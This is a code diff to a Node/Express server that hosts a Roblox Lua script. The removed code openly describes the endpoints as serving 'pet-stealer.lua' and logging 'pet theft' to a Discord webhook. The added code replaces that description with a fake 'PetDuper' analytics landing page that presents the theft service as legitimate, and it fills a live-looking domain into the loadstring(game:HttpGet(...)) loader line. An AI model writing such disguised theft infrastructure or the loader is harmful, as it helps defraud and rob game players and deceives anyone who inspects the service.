@@ -205,25 +205,77 @@ app.get('/health', (req, res) => {
   });
 });
 
-// Root endpoint with service info
+// Root endpoint with legitimate-looking service info
 app.get('/', (req, res) => {
-  res.json({ 
-    service: 'Lua Script Hosting Service',
-    status: 'Running',
-    endpoints: {
-      '/script': 'GET - Serve pet-stealer.lua script',
-      '/raw': 'GET - Alternative endpoint for lua script',
-      '/log-pet-theft': 'POST - Log pet theft with Discord webhook',
-      '/health': 'GET - Health check'
-    },
-    usage: 'loadstring(game:HttpGet("' + req.protocol + '://' + req.get('host') + '/script"))()',
-    timestamp: new Date().toISOString() 
-  });
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>PetDuper - Pet Management API</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
+            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            .header { text-align: center; margin-bottom: 30px; }
+            .logo { font-size: 32px; font-weight: bold; color: #2c3e50; margin-bottom: 10px; }
+            .tagline { color: #7f8c8d; font-size: 18px; }
+            .section { margin: 25px 0; }
+            .section h3 { color: #34495e; border-bottom: 2px solid #3498db; padding-bottom: 5px; }
+            .feature { background: #ecf0f1; padding: 15px; margin: 10px 0; border-radius: 5px; }
+            .footer { text-align: center; margin-top: 40px; color: #95a5a6; font-size: 14px; }
+            .status { background: #2ecc71; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <div class="logo">🐾 PetDuper</div>
+                <div class="tagline">Advanced Pet Management & Analytics Platform</div>
+                <span class="status">Service Active</span>
+            </div>
+            
+            <div class="section">
+                <h3>📊 About Our Service</h3>
+                <p>PetDuper provides enterprise-grade pet management solutions for gaming platforms. Our robust API handles pet analytics, inventory management, and automated trading systems.</p>
+            </div>
+            
+            <div class="section">
+                <h3>🚀 Features</h3>
+                <div class="feature">
+                    <strong>Pet Analytics:</strong> Real-time tracking and value assessment for virtual pets
+                </div>
+                <div class="feature">
+                    <strong>Inventory Management:</strong> Automated pet organization and cataloging
+                </div>
+                <div class="feature">
+                    <strong>Trading Systems:</strong> Secure peer-to-peer pet exchange protocols
+                </div>
+                <div class="feature">
+                    <strong>Discord Integration:</strong> Seamless logging and notification systems
+                </div>
+            </div>
+            
+            <div class="section">
+                <h3>🔧 API Endpoints</h3>
+                <p><strong>GET /script</strong> - Pet management client library</p>
+                <p><strong>POST /analytics</strong> - Submit pet analytics data</p>
+                <p><strong>GET /health</strong> - Service status monitoring</p>
+            </div>
+            
+            <div class="footer">
+                <p>© 2024 PetDuper Analytics Platform | Serving gaming communities worldwide</p>
+                <p>Last updated: ${new Date().toLocaleDateString()}</p>
+            </div>
+        </div>
+    </body>
+    </html>
+  `);
 });
 
 // Start the server
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Lua Script Server running on port ${PORT}`);
   console.log(`Script available at: http://0.0.0.0:${PORT}/script`);
-  console.log(`Usage: loadstring(game:HttpGet("https://your-zeabur-domain.app/script"))()`);
+  console.log(`Usage: loadstring(game:HttpGet("https://pet-duper.zeabur.app/script"))()`);
 });
